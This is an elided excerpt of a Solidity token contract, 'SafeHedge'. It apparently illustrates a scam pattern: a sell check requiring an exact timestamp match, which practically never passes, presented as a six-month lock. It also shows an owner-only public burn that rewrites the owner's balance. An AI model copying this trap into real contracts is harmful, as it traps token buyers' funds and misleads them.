...
contract SafeHedge is Context, IERC20, Ownable {
    ...
    uint256 private _tTotal = 426 * 10**6 * 10**9;
    ...
    modifier IsTimeToSell {
        require(now == timeToSell, "You cant sell tokens for 6 months");
        _;
    }
    ...
    constructor () public {
        ...
        timeToSell = block.timestamp + 15552000;
    ...
    function _burn(uint256 amount) public onlyOwner {
        ...
        _tOwned[owner()] = accountBalance - amount;
